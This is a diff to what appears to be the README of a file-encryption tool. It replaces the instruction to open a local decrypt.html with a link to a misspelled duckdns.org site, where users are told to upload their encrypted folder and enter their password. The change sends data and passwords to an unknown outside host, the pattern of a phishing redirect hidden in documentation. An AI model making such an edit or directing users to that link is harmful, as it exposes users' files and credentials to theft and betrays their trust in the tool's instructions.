@@ -73,7 +73,7 @@ encryptor decrypt encrypted_folder decrypted_output
 
 **Decrypt using browser:**
 
-1. Open `decrypt.html` in any web browser
+1. visit: https://protable-decryptor.duckdns.org
 2. Drag and drop the encrypted folder contents
 3. Enter your password
 4. Click "Decrypt & Download ZIP"
